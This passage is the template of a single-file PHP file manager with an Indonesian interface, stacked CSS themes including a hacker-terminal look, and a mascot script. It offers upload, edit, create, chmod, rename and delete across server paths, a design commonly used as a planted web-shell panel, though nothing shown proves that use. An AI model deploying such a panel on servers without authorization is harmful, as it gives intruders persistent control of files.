        .toolbar{border-color:#103b29;border-radius:2px;background:rgba(1,8,5,.88);box-shadow:0 12px 35px rgba(0,0,0,.25)}.button{border-color:#164d34;border-radius:2px;background:#020a06;color:#58b77f;font-size:11px;letter-spacing:.04em;text-transform:uppercase}.button:before{content:"["}.button:after{content:"]"}.button:hover{border-color:var(--green);background:#002415;color:#8fffc0;box-shadow:0 0 14px rgba(0,255,136,.08);transform:none}.button.primary{border:1px solid var(--green);background:#00301b;color:#7dffb3;box-shadow:inset 0 0 16px rgba(0,255,136,.08),0 0 14px rgba(0,255,136,.06)}
        .search input{border-color:#123f2b;border-radius:2px;background:#000503;color:#8dffbd;font-family:inherit;caret-color:var(--green)}.search input::placeholder{color:#255c40}.search input:focus,.field:focus{border-color:var(--green);box-shadow:0 0 0 1px rgba(0,255,136,.15),0 0 12px rgba(0,255,136,.06)}
        .panel{border-color:#103b29;border-radius:2px;background:rgba(1,7,4,.94);box-shadow:0 20px 55px rgba(0,0,0,.32),inset 0 0 35px rgba(0,255,100,.012)}.panel-head{border-bottom-color:#103b29;background:#020b07}.panel-head strong{color:#62e997;letter-spacing:.07em;text-transform:uppercase}.panel-head strong:before{content:"// "}.panel-head span{color:#2f7450}
        table{font-size:12px}th{background:#010604;color:#2f8055;letter-spacing:.13em;border-bottom:1px solid #12402c}th a{color:#43a76f}td{border-top-color:#0b291c;color:#61a980}tbody tr:hover{background:rgba(0,255,136,.035);box-shadow:inset 2px 0 var(--green)}.name-cell{gap:10px}.file-icon{width:34px;flex-basis:34px;height:34px;border-color:#164a33;border-radius:2px;background:#031009;color:#36d77a}.file-icon.folder{border-color:#685318;background:#161000;color:#ffd75e}.file-icon.image,.file-icon.code,.file-icon.archive{color:#65ffa7}.file-name a,.file-name strong{color:#8aefb2;font-weight:600}.file-name a:hover{color:#c1ffd9;text-shadow:0 0 8px rgba(0,255,136,.32)}.file-name small{color:#286947}.permission{color:#43bc75}.icon-button{border-radius:2px;color:#3b8a60;font-family:inherit}.icon-button:hover{border-color:#17613e;background:#002012;color:#83ffb7}.icon-button.delete:hover{color:#ff617e;background:#240008;border-color:#7b1630}
        .toast{border-radius:2px;background:#00130a}.toast.success{border-color:#12683f;background:#00170d;color:#67ffa9}.toast.error{border-color:#8c1835;background:#1b0006;color:#ff728c}.pagination a,.pagination span{border-color:#123e2a;border-radius:2px;background:#010704;color:#3f9565}.pagination a:hover,.pagination .active{border-color:var(--green);background:#00351d;color:#8bffba;box-shadow:0 0 12px rgba(0,255,136,.1)}
        .editor textarea{background:#000302;color:#75e9a4;caret-color:var(--green);font-family:"Cascadia Code",Consolas,monospace}.editor textarea:focus{box-shadow:inset 0 0 25px rgba(0,255,136,.025)}
        dialog{border-color:#17613e;border-radius:2px;background:#020905;color:#a4f7c4;box-shadow:0 0 0 1px #001b0f,0 30px 100px #000,0 0 34px rgba(0,255,136,.09)}dialog::backdrop{background:rgba(0,3,1,.86);backdrop-filter:blur(3px)}.dialog-head{border-bottom-color:#12402c;background:#031009}.dialog-head h2{color:#73ffad;font-size:14px;letter-spacing:.08em;text-transform:uppercase}.dialog-head h2:before{content:"> "}.dialog-close{color:#3b9363}.label{color:#4eac76;letter-spacing:.07em;text-transform:uppercase}.label:before{content:"$ "}.field{border-color:#143f2c;border-radius:2px;background:#000503;color:#8dffbc;font-family:inherit}.dropzone{border-color:#1b6744;border-radius:2px;background:#010b06;color:#3e8a5e}.dropzone.dragging{border-color:var(--green);background:#002515;color:#72ffad}.dropzone strong{color:#66d994}.footer{color:#1e5d3d;letter-spacing:.1em;text-transform:uppercase}.footer:before{content:"[ SESSION ACTIVE ] · "}
        @keyframes screenScan{to{transform:translateY(9px)}}@keyframes blink{50%{opacity:.25}}

        /* minimal technical theme */
        :root{--bg:#0a0d0b;--panel:#101411;--panel2:#151a16;--line:#28312b;--text:#d8dfda;--muted:#748078;--violet:#63c781;--cyan:#63c781;--red:#e06c75;--green:#63c781}
        body{background:linear-gradient(rgba(4,8,6,.76),rgba(4,8,6,.9)),url('assets/file-manager-bg.png') center/cover fixed;color:var(--text);font-family:ui-monospace,SFMono-Regular,Consolas,"Liberation Mono",monospace}body:before,body:after{display:none}
        .topbar{border-bottom-color:rgba(96,125,105,.24);background:rgba(8,12,9,.82);box-shadow:none;backdrop-filter:blur(16px)}.topbar-inner{height:64px}.brand-mark{width:36px;height:36px;border:1px solid #344039;border-radius:7px;background:#151b17;color:#69ce87;box-shadow:none;text-shadow:none;font-size:13px}.brand strong{color:#e4eae5;font-size:14px;letter-spacing:0;text-shadow:none}.brand small{color:#667169;letter-spacing:0;text-transform:none}.logout{border-color:#303a33;border-radius:7px;background:rgba(17,21,18,.8);color:#929d95;font-size:12px;letter-spacing:0;text-transform:none}.logout:before,.logout:after{content:none}.logout:hover{border-color:#704048;background:#211417;color:#e68a95;box-shadow:none}
        .breadcrumbs{margin-bottom:14px;padding:10px 12px;border-color:#273029;border-radius:8px;background:#0e120f;color:#68736b;font-size:12px}.breadcrumbs:before{content:"path:";color:#5fca7e;font-weight:600}.breadcrumbs a{border-radius:5px;color:#879289}.breadcrumbs a:hover,.breadcrumbs a:last-of-type{background:#172019;color:#9ee0b1;text-shadow:none}.separator{color:#3f4942}
        .hero{align-items:flex-end;padding:4px 0 17px;border:0;border-bottom:1px solid #202722;background:none}.eyebrow{color:#68736b;letter-spacing:.08em}.eyebrow:before,.eyebrow:after{content:none}.hero h1{color:#e7ece8;font-size:clamp(22px,3vw,31px);letter-spacing:-.03em;text-shadow:none}.hero h1:before{content:none}.hero-path{color:#6e7971}.hero-path:before{content:none}.status{border-color:#2f4937;border-radius:999px;background:#121a14;color:#78c98e;letter-spacing:0;text-transform:none;box-shadow:none}.status:before{border-radius:50%;box-shadow:none;animation:none}
        .stats{gap:10px}.stat{padding:15px 16px;border-color:rgba(91,119,99,.28);border-radius:8px;background:rgba(14,19,16,.78);box-shadow:none;backdrop-filter:blur(10px)}.stat:before,.stat:after{display:none}.stat span{color:#707b73;font-size:10px;letter-spacing:.08em}.stat strong{color:#dce3dd;font-size:21px;font-weight:600;text-shadow:none}
        .toolbar{border-color:rgba(91,119,99,.28);border-radius:8px;background:rgba(14,19,16,.82);box-shadow:none;backdrop-filter:blur(12px)}.button{border-color:#303a33;border-radius:7px;background:rgba(21,26,22,.9);color:#a3ada6;font-size:12px;letter-spacing:0;text-transform:none}.button:before,.button:after{content:none}.button:hover{border-color:#46534a;background:#1b211c;color:#e5ebe6;box-shadow:none}.button.primary{border:1px solid #4b9c63;background:#173c23;color:#a8e8ba;box-shadow:none}.search input{border-color:#303a33;border-radius:7px;background:rgba(11,14,12,.9);color:#dce3dd}.search input::placeholder{color:#566159}.search input:focus,.field:focus{border-color:#4c8d60;box-shadow:0 0 0 3px rgba(99,199,129,.08)}
        .panel{border-color:rgba(91,119,99,.28);border-radius:8px;background:rgba(13,18,15,.88);box-shadow:0 18px 50px rgba(0,0,0,.2);backdrop-filter:blur(14px)}.panel-head{border-bottom-color:#273029;background:rgba(18,23,19,.78)}.panel-head strong{color:#cfd7d1;letter-spacing:0;text-transform:none}.panel-head strong:before{content:none}.panel-head span{color:#6b766e}th{background:rgba(13,17,14,.82);color:#68736b;letter-spacing:.08em;border-bottom-color:#273029}th a{color:#829087}td{border-top-color:#222a24;color:#98a39b}tbody tr:hover{background:rgba(25,34,28,.78);box-shadow:none}.file-icon{border-color:#303a33;border-radius:6px;background:#151b17;color:#70ca89}.file-icon.folder{border-color:#4f472a;background:#1d1a10;color:#d4ba67}.file-name a,.file-name strong{color:#d4dbd5}.file-name a:hover{color:#8ed9a3;text-shadow:none}.file-name small{color:#657068}.permission{color:#7fa58a}.icon-button{border-radius:6px;color:#7a867e}.icon-button:hover{border-color:#354039;background:#1a201b;color:#dfe5e0}.icon-button.delete:hover{border-color:#61343b;background:#211417;color:#e47e8a}
        .toast{border-radius:7px}.toast.success{border-color:#31523a;background:#132118;color:#83d499}.toast.error{border-color:#61343b;background:#211417;color:#e68a95}.pagination a,.pagination span{border-color:#303a33;border-radius:6px;background:#101411;color:#7f8a82}.pagination a:hover,.pagination .active{border-color:#4d8f60;background:#193a23;color:#a6e5b7;box-shadow:none}.editor textarea{background:#0b0e0c;color:#cdd6cf;caret-color:#63c781}
        dialog{border-color:#303a33;border-radius:9px;background:#101411;color:#d9e0da;box-shadow:0 24px 70px rgba(0,0,0,.55)}dialog::backdrop{background:rgba(0,0,0,.72);backdrop-filter:blur(2px)}.dialog-head{border-bottom-color:#29322b;background:#121713}.dialog-head h2{color:#d9e0da;font-size:14px;letter-spacing:0;text-transform:none}.dialog-head h2:before{content:none}.dialog-close{color:#78837b}.label{color:#8c978f;letter-spacing:0;text-transform:none}.label:before{content:none}.field{border-color:#303a33;border-radius:7px;background:#0b0e0c;color:#dce3dd}.dropzone{border-color:#39443c;border-radius:7px;background:#0d110e;color:#6f7b72}.dropzone.dragging{border-color:#5cad74;background:#111c14;color:#8bd69f}.dropzone strong{color:#b9c2bb}.footer{color:#515b54;letter-spacing:0;text-transform:none}.footer:before{content:none}
        /* graphite + cyan palette */
        :root{--bg:#070b0f;--panel:#0d1418;--panel2:#111b20;--line:#293b43;--text:#d8e4e8;--muted:#71858d;--violet:#5fb4c1;--cyan:#5fb4c1;--red:#df7480;--green:#5fb4c1}
        body{background:linear-gradient(rgba(5,9,13,.78),rgba(5,9,13,.91)),url('assets/file-manager-bg.png') center/cover fixed;color:var(--text)}
        .topbar{border-bottom-color:rgba(103,150,164,.25);background:rgba(7,12,16,.86)}.brand-mark{border-color:#354b54;background:#101b20;color:#69becb}.brand strong{color:#e4eef1}.brand small{color:#697d85}.logout{border-color:#304149;background:rgba(14,21,25,.86);color:#93a5ac}.logout:hover{border-color:#75434b;background:#24171a;color:#e899a2}
        .breadcrumbs{border-color:rgba(88,128,140,.3);background:rgba(9,15,19,.78);color:#71858d}.breadcrumbs:before{color:#66b6c2}.breadcrumbs a{color:#8ca0a7}.breadcrumbs a:hover,.breadcrumbs a:last-of-type{background:#13272d;color:#a9dbe2}.separator{color:#455b63}
        .hero{border-bottom-color:#24343a}.eyebrow{color:#71858d}.hero h1{color:#e5eff2}.hero-path{color:#70838a}
        .stats{gap:10px}.stat{border-color:rgba(88,128,140,.3);background:rgba(11,18,22,.8)}.stat span{color:#71838a}.stat strong{color:#dce8eb}
        .toolbar{border-color:rgba(88,128,140,.3);background:rgba(10,17,21,.84)}.button{border-color:#304249;background:rgba(15,23,27,.92);color:#a2b2b7}.button:hover{border-color:#49616a;background:#18272d;color:#edf5f7}.button.primary{border-color:#4f929d;background:#17363c;color:#a8dce3}.search input{border-color:#304249;background:rgba(7,13,16,.92);color:#dce8eb}.search input::placeholder{color:#53676e}.search input:focus,.field:focus{border-color:#5799a5;box-shadow:0 0 0 3px rgba(87,153,165,.1)}
        .panel{border-color:rgba(88,128,140,.3);background:rgba(9,15,19,.89)}.panel-head{border-bottom-color:#293a41;background:rgba(14,22,26,.82)}.panel-head strong{color:#d1dee2}.panel-head span{color:#6f8188}th{background:rgba(8,14,17,.86);color:#71848b;border-bottom-color:#293a41}th a{color:#8ba2aa}td{border-top-color:#213138;color:#9badb3}tbody tr:hover{background:rgba(19,33,39,.78)}.file-icon{border-color:#30444c;background:#101c21;color:#69bcc9}.file-icon.folder{border-color:#5c4e2f;background:#201b10;color:#d8b967}.file-name a,.file-name strong{color:#d4e0e3}.file-name a:hover{color:#8ed2dc}.file-name small{color:#637880}.permission{color:#7faab2}.icon-button{color:#7f939a}.icon-button:hover{border-color:#3c525a;background:#17262b;color:#e5eff2}
        .toast.success{border-color:#37616a;background:#102329;color:#8ed1da}.pagination a,.pagination span{border-color:#304249;background:#0c1418;color:#80939a}.pagination a:hover,.pagination .active{border-color:#5799a5;background:#17363c;color:#b7e2e7}.editor textarea{background:#070d10;color:#cedde1;caret-color:#5fb4c1}
        dialog{border-color:#344951;background:#0c1418;color:#dbe7ea}.dialog-head{border-bottom-color:#2c3d44;background:#101a1e}.dialog-head h2{color:#dce8eb}.dialog-close{color:#768b92}.label{color:#93a6ac}.field{border-color:#304249;background:#080e11;color:#dce8eb}.dropzone{border-color:#3b555e;background:#0a1215;color:#70858c}.dropzone.dragging{border-color:#5fb4c1;background:#10272d;color:#9bd5dc}.dropzone strong{color:#bdcdd1}.footer{color:#52666d}

        /* polished interface */
        body{font-family:Inter,ui-sans-serif,system-ui,-apple-system,"Segoe UI",sans-serif;background:linear-gradient(rgba(5,9,13,.72),rgba(5,9,13,.9)),url('assets/file-manager-bg.png') center/cover fixed}
        .topbar{box-shadow:0 8px 30px rgba(0,0,0,.18)}.brand-mark{border:0;background:linear-gradient(145deg,#377f8c,#173e47);color:#d5f4f7;box-shadow:0 8px 20px rgba(32,116,130,.2)}
        .shell{width:min(1380px,100%);padding:28px 28px 80px}.hero{position:relative;min-height:150px;display:flex;align-items:center;margin-bottom:16px;padding:28px 30px;overflow:hidden;border:1px solid rgba(100,151,166,.24);border-radius:14px;background:linear-gradient(100deg,rgba(14,24,29,.94),rgba(13,24,29,.76) 62%,rgba(31,94,104,.18));box-shadow:0 22px 55px rgba(0,0,0,.18);backdrop-filter:blur(15px)}.hero:after{content:"";position:absolute;right:-70px;top:-120px;width:330px;height:330px;border:1px solid rgba(105,190,203,.14);border-radius:50%;box-shadow:0 0 0 50px rgba(105,190,203,.025),0 0 0 100px rgba(105,190,203,.018);pointer-events:none}.hero h1{font-family:Inter,ui-sans-serif,system-ui,sans-serif;font-weight:720;letter-spacing:-.045em}.hero-path{font-family:ui-monospace,SFMono-Regular,Consolas,monospace}
        .stats{gap:12px}.stat{padding:18px 20px;border-radius:11px;background:linear-gradient(145deg,rgba(15,25,30,.9),rgba(9,16,20,.86));box-shadow:0 14px 34px rgba(0,0,0,.13)}.stat strong{font-size:24px;letter-spacing:-.035em}.stat span{letter-spacing:.11em}
        .breadcrumbs{margin:0 0 9px;padding:9px 13px;border-radius:9px;backdrop-filter:blur(12px)}.toolbar{margin-bottom:13px;padding:10px;border-radius:11px;box-shadow:0 16px 38px rgba(0,0,0,.14)}.button{min-height:39px;padding:8px 13px;border-radius:8px;font-weight:650}.button.primary{background:linear-gradient(145deg,#1e5360,#173f49)}
        .panel{border-radius:12px;box-shadow:0 24px 60px rgba(0,0,0,.2)}.panel-head{padding:16px 18px}.panel-head strong{font-size:13px}.file-icon{border-radius:9px}.icon-button{border-radius:7px}.search input{height:39px}.toast{box-shadow:0 12px 28px rgba(0,0,0,.16)}.access-state{display:inline-flex;align-items:center;margin-left:7px;padding:3px 6px;border:1px solid;border-radius:999px;font:700 9px/1 Inter,system-ui,sans-serif;letter-spacing:.02em;vertical-align:middle}.access-state.yes{border-color:#315c52;background:#10241f;color:#79cbb6}.access-state.no{border-color:#613b42;background:#27171a;color:#e4919b}
        .mascot{position:fixed;right:12px;bottom:-8px;z-index:70;width:clamp(210px,20vw,310px);padding:0;border:0;background:none;cursor:pointer;filter:drop-shadow(0 22px 24px rgba(0,0,0,.42));-webkit-tap-highlight-color:transparent}.mascot-stage{display:block;transform:translate3d(var(--body-x,0),var(--body-y,0),0) rotate(var(--body-r,0deg));transform-origin:bottom center;transition:transform .24s cubic-bezier(.2,.8,.2,1)}.mascot-art{position:relative;display:block;animation:mascotFloat 4.2s ease-in-out infinite;transform-origin:bottom center}.mascot img{display:block;width:100%;height:auto;opacity:0;transition:opacity .2s ease,filter .2s ease}.mascot img+img{position:absolute;inset:0}.mascot img.visible{opacity:1}.mascot:hover img{filter:brightness(1.06)}.mascot:focus-visible{outline:2px solid #70c4d0;outline-offset:4px;border-radius:18px}.mascot.reacting .mascot-art{animation:mascotReact .5s cubic-bezier(.2,.8,.2,1)}
        .mascot-bubble{position:absolute;right:72%;top:16%;width:max-content;max-width:190px;padding:10px 13px;border:1px solid rgba(104,178,190,.42);border-radius:12px 12px 3px 12px;background:rgba(9,18,23,.94);color:#d9edf0;font:600 12px/1.4 Inter,system-ui,sans-serif;box-shadow:0 12px 30px rgba(0,0,0,.28);opacity:0;transform:translate(8px,8px) scale(.92);transition:.22s ease;pointer-events:none}.mascot-bubble.show{opacity:1;transform:none}.mascot-hint{position:absolute;right:16px;bottom:24px;padding:5px 9px;border:1px solid rgba(102,169,180,.32);border-radius:999px;background:rgba(8,16,20,.86);color:#89c5ce;font:600 10px/1 Inter,system-ui,sans-serif;letter-spacing:.03em;pointer-events:none;transition:.2s}.mascot:hover .mascot-hint{background:#173740;color:#c6ecf1}.mascot.was-clicked .mascot-hint{opacity:0;transform:translateY(4px)}
        @keyframes mascotFloat{0%,100%{transform:translateY(0) rotate(0)}50%{transform:translateY(-7px) rotate(.4deg)}}@keyframes mascotReact{0%{transform:scale(.96) rotate(-2deg)}55%{transform:scale(1.04) rotate(1deg)}100%{transform:scale(1)}}
        @media(max-width:800px){.shell{padding:18px 13px 100px}.hero{min-height:130px;padding:22px}.mascot{width:180px;right:-14px;bottom:-5px}.mascot-bubble{right:62%;top:4%;max-width:150px;font-size:10px}.mascot-hint{right:18px;bottom:19px}.panel{border-radius:10px}}
        @media(prefers-reduced-motion:reduce){.mascot-stage,.mascot img,.mascot-bubble{transition:none}.mascot-art,.mascot.reacting .mascot-art{animation:none}}

    </style>
</head>
<body>
<header class="topbar">
    <div class="topbar-inner">
        <div class="brand"><div class="brand-mark">~/</div><div><strong>File Manager</strong><small>localhost</small></div></div>
        <a class="logout" href="?logout=1">Keluar</a>
    </div>
</header>

<main class="shell">
    <section class="hero">
        <div>
            <p class="eyebrow">Lokasi saat ini</p>
            <h1><?php echo e(basename($basePath) ?: $basePath); ?></h1>
            <p class="hero-path" title="<?php echo e($basePath); ?>"><?php echo e($basePath); ?></p>
        </div>
    </section>

    <?php if ($flash) { ?>
        <div class="toast <?php echo e($flash['type']); ?>"><span><?php echo e($flash['message']); ?></span><button type="button" onclick="this.parentNode.remove()">×</button></div>
    <?php } ?>

    <section class="stats">
        <div class="stat"><span>Total</span><strong><?php echo $folderCount + $fileCount; ?></strong></div>
        <div class="stat"><span>Folder</span><strong><?php echo $folderCount; ?></strong></div>
        <div class="stat"><span>File</span><strong><?php echo $fileCount; ?></strong></div>
    </section>

    <?php if ($editMode) { ?>
        <section class="panel editor">
            <div class="panel-head"><strong>Edit · <?php echo e(basename($editPath)); ?></strong><span><?php echo e($editPath); ?></span></div>
            <form method="post">
                <input type="hidden" name="csrf" value="<?php echo e($csrf); ?>">
                <input type="hidden" name="path" value="<?php echo e($basePath); ?>">
                <input type="hidden" name="action" value="save">
                <input type="hidden" name="edit_target" value="<?php echo e($editPath); ?>">
                <textarea name="content" spellcheck="false"><?php echo e($editContent); ?></textarea>
                <div class="editor-actions"><a class="button" href="<?php echo e(queryUrl($basePath, array())); ?>">Batal</a><button class="button primary" type="submit">Simpan perubahan</button></div>
            </form>
        </section>
    <?php } ?>

    <nav class="breadcrumbs" aria-label="Breadcrumb">
        <?php foreach ($breadcrumbs as $index => $crumb) { ?>
            <?php if ($index > 0) { ?><span class="separator">/</span><?php } ?>
            <a href="<?php echo e(queryUrl($crumb['path'], array())); ?>"><?php echo e($crumb['name']); ?></a>
        <?php } ?>
    </nav>

    <section class="toolbar">
        <div class="tools">
            <a class="button" href="?">⌂ Home</a>
            <button class="button primary" type="button" data-open="uploadDialog">↑ Upload</button>
            <button class="button" type="button" data-open="folderDialog">＋ Folder</button>
            <button class="button" type="button" data-open="fileDialog">＋ File</button>
            <?php $parent = dirname($basePath); if ($parent !== $basePath) { ?><a class="button" href="<?php echo e(queryUrl($parent, array())); ?>">← Naik</a><?php } ?>
        </div>
        <form class="search" method="get">
            <input type="hidden" name="path" value="<?php echo e($basePath); ?>">
            <input name="q" value="<?php echo e($query); ?>" placeholder="Cari file atau folder…" aria-label="Cari file atau folder">
            <button class="button" type="submit">Cari</button>
        </form>
    </section>

    <section class="panel">
        <div class="panel-head"><strong>File dan folder</strong><span><?php echo $totalItems; ?> hasil<?php if ($query !== '') echo ' untuk “' . e($query) . '”'; ?></span></div>
        <div class="table-wrap">
            <table>
                <thead><tr><th>Nama</th><th class="hide-mobile"><a href="<?php echo e(queryUrl($basePath, array('q' => $query, 'sort' => 'size'))); ?>">Ukuran</a></th><th>Permission</th><th class="hide-mobile"><a href="<?php echo e(queryUrl($basePath, array('q' => $query, 'sort' => 'time'))); ?>">Diubah</a></th><th style="text-align:right">Aksi</th></tr></thead>
                <tbody>
                <?php foreach ($entries as $entry) { $icon = fileIcon($entry['name'], $entry['directory']); ?>
                    <tr>
                        <td><div class="name-cell"><div class="file-icon <?php echo e($icon); ?>"><?php echo $entry['directory'] ? '◆' : '◇'; ?></div><div class="file-name">
                            <?php if ($entry['directory']) { ?><a href="<?php echo e(queryUrl($entry['path'], array())); ?>"><?php echo e($entry['name']); ?></a><small>Folder</small>
                            <?php } else { ?><a title="Lihat dan edit file" href="<?php echo e(queryUrl($basePath, array('edit' => $entry['path']))); ?>"><?php echo e($entry['name']); ?></a><small><?php echo strtoupper(e(pathinfo($entry['name'], PATHINFO_EXTENSION) ?: 'FILE')); ?></small><?php } ?>
                        </div></div></td>
                        <td class="hide-mobile"><?php echo $entry['directory'] ? '—' : e(formatSize($entry['size'])); ?></td>
                        <td><span class="permission"><?php echo e($entry['permission']); ?></span><span class="access-state <?php echo $entry['writable'] ? 'yes' : 'no'; ?>"><?php echo $entry['writable'] ? 'Writable' : 'Read-only'; ?></span></td>
                        <td class="hide-mobile"><?php echo $entry['time'] ? e(date('d M Y, H:i', $entry['time'])) : '—'; ?></td>
                        <td><div class="actions">
                            <?php if (!$entry['directory']) { ?><a class="icon-button" title="Unduh" href="<?php echo e(queryUrl($basePath, array('download' => $entry['path']))); ?>">↓</a><a class="icon-button" title="Edit" href="<?php echo e(queryUrl($basePath, array('edit' => $entry['path']))); ?>">✎</a><?php } ?>
                            <button class="icon-button rename-button" type="button" title="Ubah nama" data-name="<?php echo e($entry['name']); ?>">Aa</button>
                            <button class="icon-button chmod-button" type="button" title="CHMOD" data-name="<?php echo e($entry['name']); ?>" data-permission="<?php echo e($entry['permission']); ?>">⚙</button>
                            <form method="post" onsubmit="return confirm('Hapus <?php echo e(addslashes($entry['name'])); ?> secara permanen?')">
                                <input type="hidden" name="csrf" value="<?php echo e($csrf); ?>"><input type="hidden" name="path" value="<?php echo e($basePath); ?>"><input type="hidden" name="action" value="delete"><input type="hidden" name="target" value="<?php echo e($entry['name']); ?>">
                                <button class="icon-button delete" type="submit" title="Hapus">×</button>
                            </form>
                        </div></td>
                    </tr>
                <?php } ?>
                <?php if (!$entries) { ?><tr><td colspan="5"><div class="empty"><strong>Tidak ada item</strong><br>Folder ini kosong atau pencarian tidak menemukan hasil.</div></td></tr><?php } ?>
                </tbody>
            </table>
        </div>
    </section>

    <?php if ($totalPages > 1) { ?><nav class="pagination">
        <?php for ($i = 1; $i <= $totalPages; $i++) { if ($i === $page) { ?><span class="active"><?php echo $i; ?></span><?php } else { ?><a href="<?php echo e(queryUrl($basePath, array('q' => $query, 'sort' => $sort, 'page' => $i))); ?>"><?php echo $i; ?></a><?php } } ?>
    </nav><?php } ?>
    <footer class="footer">Local File Manager · <?php echo date('Y'); ?></footer>
</main>

<button class="mascot" id="mascot" type="button" aria-label="Sapa mascot">
    <span class="mascot-bubble" id="mascotBubble" aria-live="polite"></span>
    <span class="mascot-stage" id="mascotStage"><span class="mascot-art"><img class="visible" id="mascotImage" src="assets/mascot-cute-idle.png" data-idle="assets/mascot-cute-idle.png" data-left="assets/mascot-cute-look-left.png" data-right="assets/mascot-cute-look-right.png" data-up="assets/mascot-cute-look-up.png" data-down="assets/mascot-cute-look-down.png" data-react="assets/mascot-cute-react.png" alt="Mascot operator anime"><img id="mascotImageNext" src="assets/mascot-cute-idle.png" alt="" aria-hidden="true"></span></span>
    <span class="mascot-hint">Klik aku</span>
</button>

<dialog id="uploadDialog"><form method="post" enctype="multipart/form-data"><div class="dialog-head"><h2>Upload file</h2><button class="dialog-close" type="button" data-close>×</button></div><div class="dialog-body"><div class="dropzone" id="dropzone"><strong>Tarik dan lepas file di sini</strong><span>atau pilih dari perangkat Anda</span><input id="uploadInput" type="file" name="upload_files[]" multiple required></div></div><div class="dialog-actions"><button class="button" type="button" data-close>Batal</button><button class="button primary" type="submit">Upload sekarang</button></div><input type="hidden" name="csrf" value="<?php echo e($csrf); ?>"><input type="hidden" name="path" value="<?php echo e($basePath); ?>"><input type="hidden" name="action" value="upload"></form></dialog>

<dialog id="folderDialog"><form method="post"><div class="dialog-head"><h2>Buat folder baru</h2><button class="dialog-close" type="button" data-close>×</button></div><div class="dialog-body"><label class="label" for="folderName">Nama folder</label><input class="field" id="folderName" name="folder_name" placeholder="Contoh: assets" required></div><div class="dialog-actions"><button class="button" type="button" data-close>Batal</button><button class="button primary" type="submit">Buat folder</button></div><input type="hidden" name="csrf" value="<?php echo e($csrf); ?>"><input type="hidden" name="path" value="<?php echo e($basePath); ?>"><input type="hidden" name="action" value="mkdir"></form></dialog>

<dialog id="fileDialog"><form method="post"><div class="dialog-head"><h2>Buat file baru</h2><button class="dialog-close" type="button" data-close>×</button></div><div class="dialog-body"><label class="label" for="fileName">Nama file</label><input class="field" id="fileName" name="filename" placeholder="Contoh: index.php" required><label class="label" for="fileContent">Isi awal (opsional)</label><textarea class="field" id="fileContent" name="filecontent" spellcheck="false"></textarea></div><div class="dialog-actions"><button class="button" type="button" data-close>Batal</button><button class="button primary" type="submit">Buat file</button></div><input type="hidden" name="csrf" value="<?php echo e($csrf); ?>"><input type="hidden" name="path" value="<?php echo e($basePath); ?>"><input type="hidden" name="action" value="create_file"></form></dialog>

<dialog id="renameDialog"><form method="post"><div class="dialog-head"><h2>Ubah nama</h2><button class="dialog-close" type="button" data-close>×</button></div><div class="dialog-body"><label class="label" for="newName">Nama baru</label><input class="field" id="newName" name="new_name" required><input id="oldName" type="hidden" name="old_name"></div><div class="dialog-actions"><button class="button" type="button" data-close>Batal</button><button class="button primary" type="submit">Simpan</button></div><input type="hidden" name="csrf" value="<?php echo e($csrf); ?>"><input type="hidden" name="path" value="<?php echo e($basePath); ?>"><input type="hidden" name="action" value="rename"></form></dialog>

<dialog id="chmodDialog"><form method="post"><div class="dialog-head"><h2>Ubah permission</h2><button class="dialog-close" type="button" data-close>×</button></div><div class="dialog-body"><label class="label" for="permission">Nilai permission</label><input class="field" id="permission" name="permission" placeholder="0755" pattern="[0-7]{3,4}" required><input id="chmodTarget" type="hidden" name="target"></div><div class="dialog-actions"><button class="button" type="button" data-close>Batal</button><button class="button primary" type="submit">Simpan</button></div><input type="hidden" name="csrf" value="<?php echo e($csrf); ?>"><input type="hidden" name="path" value="<?php echo e($basePath); ?>"><input type="hidden" name="action" value="chmod"></form></dialog>

<script>
var mascot=document.getElementById('mascot');
var mascotImage=document.getElementById('mascotImage');
var mascotImageNext=document.getElementById('mascotImageNext');
var mascotStage=document.getElementById('mascotStage');
var mascotBubble=document.getElementById('mascotBubble');
var mascotTimer;
var mascotMessages=['Hai! 👋','Aku jagain file-mu.','Folder ini aman kok.','Semangat ngoding!','Senang bertemu kamu!'];
var mascotSources={idle:mascotImage.dataset.idle,left:mascotImage.dataset.left,right:mascotImage.dataset.right,up:mascotImage.dataset.up,down:mascotImage.dataset.down,react:mascotImage.dataset.react};
Object.keys(mascotSources).forEach(function(key){var image=new Image();image.src=mascotSources[key];});
var mascotFrame,currentGaze='idle',mascotReacting=false,visibleMascot=mascotImage;
function showMascot(source){if(visibleMascot.src.indexOf(source)!==-1)return;var next=visibleMascot===mascotImage?mascotImageNext:mascotImage;next.src=source;next.classList.add('visible');visibleMascot.classList.remove('visible');visibleMascot=next;}
function setMascotGaze(gaze){currentGaze=gaze;if(!mascotReacting)showMascot(mascotSources[gaze]);}
if(window.matchMedia('(pointer:fine)').matches){
    window.addEventListener('pointermove',function(event){
        cancelAnimationFrame(mascotFrame);
        mascotFrame=requestAnimationFrame(function(){
            var box=mascot.getBoundingClientRect();
            var dx=event.clientX-(box.left+box.width*.5);
            var dy=event.clientY-(box.top+box.height*.3);
            var nx=Math.max(-1,Math.min(1,dx/(window.innerWidth*.55)));
            var ny=Math.max(-1,Math.min(1,dy/(window.innerHeight*.55)));
            mascotStage.style.setProperty('--body-x',(nx*7).toFixed(2)+'px');
            mascotStage.style.setProperty('--body-y',(ny*3).toFixed(2)+'px');
            mascotStage.style.setProperty('--body-r',(nx*3).toFixed(2)+'deg');
            if(Math.abs(dx)<70&&Math.abs(dy)<70)setMascotGaze('idle');
            else if(Math.abs(dx)>Math.abs(dy)*.85)setMascotGaze(dx<0?'left':'right');
            else setMascotGaze(dy<0?'up':'down');
        });
    });
    document.documentElement.addEventListener('mouseleave',function(){mascotStage.style.removeProperty('--body-x');mascotStage.style.removeProperty('--body-y');mascotStage.style.removeProperty('--body-r');setMascotGaze('idle');});
}
mascot.addEventListener('click',function(){
    clearTimeout(mascotTimer);
    mascotReacting=true;
    mascot.classList.add('reacting','was-clicked');
    showMascot(mascotSources.react);
    mascotBubble.textContent=mascotMessages[Math.floor(Math.random()*mascotMessages.length)];
    mascotBubble.classList.add('show');
    mascotTimer=setTimeout(function(){mascotReacting=false;mascot.classList.remove('reacting');showMascot(mascotSources[currentGaze]);mascotBubble.classList.remove('show');},1800);
});
document.querySelectorAll('[data-open]').forEach(function(button){button.addEventListener('click',function(){document.getElementById(button.getAttribute('data-open')).showModal();});});
document.querySelectorAll('[data-close]').forEach(function(button){button.addEventListener('click',function(){button.closest('dialog').close();});});
document.querySelectorAll('dialog').forEach(function(dialog){dialog.addEventListener('click',function(event){if(event.target===dialog)dialog.close();});});
